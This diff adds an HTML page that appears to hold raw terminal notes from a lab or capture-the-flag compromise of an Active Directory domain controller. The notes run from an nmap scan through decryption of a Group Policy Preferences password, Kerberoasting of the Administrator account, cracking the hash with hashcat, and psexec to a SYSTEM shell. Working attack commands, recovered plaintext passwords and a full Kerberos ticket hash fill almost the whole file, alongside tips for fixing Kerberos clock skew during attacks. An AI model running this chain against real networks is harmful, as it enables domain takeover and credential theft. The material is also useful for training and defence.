@@ -1,0 +1,129 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>More Data</title>
+</head><body>──(root㉿kali)-[~]<br/>
+└─# nmap -T5 192.168.17.132                 <br/>
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-20 12:09 IST<br/>
+Nmap scan report for 192.168.17.132<br/>
+Host is up (0.00099s latency).<br/>
+Not shown: 981 closed tcp ports (reset)<br/>
+PORT   STATE SERVICE<br/>
+53/tcp  open domain<br/>
+88/tcp  open kerberos-sec<br/>
+135/tcp  open msrpc<br/>
+139/tcp  open netbios-ssn<br/>
+389/tcp  open ldap<br/>
+445/tcp  open microsoft-ds<br/>
+464/tcp  open kpasswd5<br/>
+593/tcp  open http-rpc-epmap<br/>
+636/tcp  open ldapssl<br/>
+3268/tcp open globalcatLDAP<br/>
+3269/tcp open globalcatLDAPssl<br/>
+49152/tcp open unknown<br/>
+49153/tcp open unknown<br/>
+49154/tcp open unknown<br/>
+49155/tcp open unknown<br/>
+49157/tcp open unknown<br/>
+49158/tcp open unknown<br/>
+49159/tcp open unknown<br/>
+49165/tcp open unknown<br/>
+MAC Address: 00:0C:29:9A:64:96 (VMware)<br/>
+<br/>
+Nmap done: 1 IP address (1 host up) scanned in 6.06 seconds<br/>
+                              <br/>
+<br/>
+┌──(root㉿kali)-[~/{A59B26ED-C1C0-45B8-ABE8-4B22B856BC92}/Machine/Preferences/Groups]<br/>
+└─# cat Groups.xml   <br/>
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br/>
+&lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&gt;&lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;GROUPP.local\vulfilip&quot; image=&quot;2&quot; changed=&quot;2023-04-21 08:32:36&quot; uid=&quot;{63E57A44-A56A-480A-9707-987A4047CBBA}&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;YCR5ucnXrFGd/IYMhUQJe7BT+0Uo4u8vwhtfBHdKwjP5Br8BCQr5mQkYlgjYaqy2O+tjweYlqHwqvvXpewoUyeEPJMllxGkCdJV1dqhYJXDBHVyMB2qmOWBwkpC85+Vt&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;GROUPP.local\vulfilip&quot;/&gt;&lt;/User&gt;<br/>
+&lt;/Groups&gt;<br/>
+<br/>
+<br/>
+<br/>
+┌──(root㉿kali)-[~/{A59B26ED-C1C0-45B8-ABE8-4B22B856BC92}/Machine/Preferences/Groups]<br/>
+└─# gpp-decrypt YCR5ucnXrFGd/IYMhUQJe7BT+0Uo4u8vwhtfBHdKwjP5Br8BCQr5mQkYlgjYaqy2O+tjweYlqHwqvvXpewoUyeEPJMllxGkCdJV1dqhYJXDBHVyMB2qmOWBwkpC85+Vt<br/>
+!!ImpossibleToCrack@ThisWasntThatHardWasIt?1<br/>
+<br/>
+psexec.py GROUPP.local\vulfilip:!!ImpossibleToCrack@ThisWasntThatHardWasIt?1@192.168.17.132<br/>
+psexec.py vulfilip:!!ImpossibleToCrack@ThisWasntThatHardWasIt?1@192.168.17.132<br/>
+<br/>
+anonymous<br/>
+<br/>
+<br/>
+GetUserSPNs.py GROUPP.local\vulfilip:!!ImpossibleToCrack@ThisWasntThatHardWasIt?1 -dc-ip 192.168.17.132 -request<br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# psexec.py &quot;vulfilip&quot;:@192.168.17.132                                <br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+Password:<br/>
+[*] Requesting shares on 192.168.17.132.....<br/>
+[-] share 'ADMIN$' is not writable.<br/>
+[-] share 'Backups' is not writable.<br/>
+[-] share 'C$' is not writable.<br/>
+[-] share 'NETLOGON' is not writable.<br/>
+[-] share 'SYSVOL' is not writable.<br/>
+[-] share 'Users' is not writable.<br/>
+                                                                              <br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# <br/>
+<br/>
+<br/>
+PSA/FIX - Clock skew too great (Kerberos)<br/>
+<br/>
+Kerberos may fail if the time skew between the client (you) and the Key Distribution Center (KDC) is greater than five minutes. You will tend to see this issue when attempting to Kerberoast a service account and instead get the error KRB_AP_ERR_SKEW. To resolve this, synchronize the client's clock with the KDC by running sudo ntpdate &lt;dc_ip&gt;.<br/>
+<br/>
+If you don't have ntpdate installed, you can install it by running sudo apt install -y ntpdate and then run the above command to set the clock.<br/>
+<br/>
+In the event you still get the KRB_AP_ERR_SKEW error after using ntpdate, you might need to use rdate instead. If you don't have rdate installed, you can install it by running sudo apt install -y rdate and then run rdate -n &lt;dc_ip&gt;. After that, try the kerberoasting again. <br/>
+<br/>
+<br/>
+Maybe if clock skew persists after ntpdate command, try <br/>
+```timedatectl set-ntp true<br/>
+timedatectl set-ntp false``` <br/>
+and then retry ntpdate command. That usually works for me.<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# GetUserSPNs.py GROUPP.local/vulfilip:'!!ImpossibleToCrack@ThisWasntThatHardWasIt?1' -dc-ip 192.168.17.132 -request<br/>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.<br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+ServicePrincipalName            Name      MemberOf                          PasswordLastSet   LastLogon      <br/>
+----------------------------------------- ------------- ---------------------------------------------------------- ------------------- -------------------<br/>
+Group-DC/Administrator.GROUPP.local:60111 Administrator CN=Group Policy Creator Owners,CN=Users,DC=GROUPP,DC=local 2023-07-21 00:34:01 2023-07-21 03:41:30 <br/>
+<br/>
+<br/>
+<br/>
+$krb5tgs$23$*Administrator$GROUPP.LOCAL$Group-DC/Administrator.GROUPP.local~60111*$fd9364603d6c10089bc06cf4dc2c7140$10c3879d9af35b814a43a66282af819813fc9df9121a53917597dda7e4dbd28dcdfdf9e7251a8b780c17c412b383cd96859232d7f1be8d1b01619a92c38ee66fc02d0dafdd562ff2ebd2d7792b5eeedbfea0c6be82af27a0de4230bd8354cf84dc2d2c6b965d274c6845959c3aba3095d27bc3fec7c6ea059c33b724388203f6bcbedbdc54b0ea0a75192a3835367e999e6ef82b1176bc79dfeb172d2a3a6887c4e8312b97af09f612508207344b8a3c48201e4a7170ade040a9dca48e9fa407d29b06b8d0ef67301240374b9346229dc0f34f9d0848be478f7abc27991e8b7f3eda8343257703f509a5599a269cd1f6809f885ddae3177134dcdd8963531c8aa1d963be3e32611ec0ec63efb879174e21d5533a95375571f8eb54da0eb3cc620c94de6a9edc259e1c5f2603d0c245add2ead7b115ca8086c512e0d41fea934edbbf9d86eb27f271854c4e48c593f3c3bdef6f0d62daeac295f6770acd42a3d49b3c7003879feb8a0a0814465efc26dd02e8b5aed6bb8a7688bab630e0c38628fdb5b0aca7aa1cbddbf25ed23483f9fd53f375e99be66a0a7140dcb47ce60ad5d27e41ca965d0ea72b6edac64b601811b6b48568fccb74334dd9410fa1551271b7113c5b91271d40a09de155cd7e770e0a81b2832c8c8779a148271e0b1602ee3380b13f66b028c1a84f2f487dbd5a3d11606ac970197a56326d1e016d796eaeaf14d6318e4a28d4375a0c4d7f4391d10c9518853664f81000c5f52745a58289d53a713dd5d4914b0534032e3f37d18608901a6714b4b10f17dfb65933e64bc94f63cae733f5ecc111a802840b2b5b74bceacaebdb28a78641121adb6504fdd3bfa3fc5cf8b74b35477bf22e7d7322882256095ccb0ba041aff16cf7a893f844a44e2378b6eb343e48db7e754d04a95f1c575a0a29e7ebd041b7627fdb7a47fe047b888a4e9c72287d67fd271f106c9f057e0b1a7f6ea18d175f2ab174eaeea84cf828ac5979c40004550f08103a1282f0605e0cde24bab8dabe1f3d69d5c1f2eef19c0e1cbfe7bfc55d0c4b8ac282f47d6f1d18619dccc5048436fb7b0980cb2265afa73db783f712bd9b8d7a6ec68ad3f672fdb0ae7958112145b9c737378221b44f03403222d1d6fee4521bfdf4c494aa7690a81f67034e9a6b9916284dd6363c871ea8f815c3eb0b00bb051d632d4eda4b9dbd654d25511b80637baa36f04db8ac921c621248fadd6e492bd7eab02c515abf2fea1cb66e5eb10963c9a73876260bff0f2fa78d98e0054e0c9a7f7a0bd5f3145e2c7104efcf4c19769233c5994816ea5533093fb13068c3ba05e09fc69e93ca48dd992a7084fa1779547384e7f2358b96<br/>
+<br/>
+<br/>
+PS C:\Users\pabla\Downloads\hashcat-6.2.6&gt; .\hashcat.exe -m 13100 .\hashes4.txt .\rockyou.txt -O<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# psexec.py GROUPP.local/Administrator:'P@$$w0rd!'@192.168.17.132<br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+[*] Requesting shares on 192.168.17.132.....<br/>
+[*] Found writable share ADMIN$<br/>
+[*] Uploading file AuCCKuRU.exe<br/>
+[*] Opening SVCManager on 192.168.17.132.....<br/>
+[*] Creating service CLcn on 192.168.17.132.....<br/>
+[*] Starting service CLcn.....<br/>
+[!] Press help for extra shell commands<br/>
+Microsoft Windows [Version 6.3.9600]<br/>
+(c) 2013 Microsoft Corporation. All rights reserved.<br/>
+<br/>
+C:\Windows\system32&gt;whoami<br/>
+nt authority\system<br/>
+<br/>
+C:\Windows\system32&gt;host<br/>
+'host' is not recognized as an internal or external command,<br/>
+operable program or batch file.<br/>
+<br/>
+C:\Windows\system32&gt;hostname<br/>
+Group-DC<br/>
+<br/>
+C:\Windows\system32&gt;<br/>
+<br/>
+</body></html>
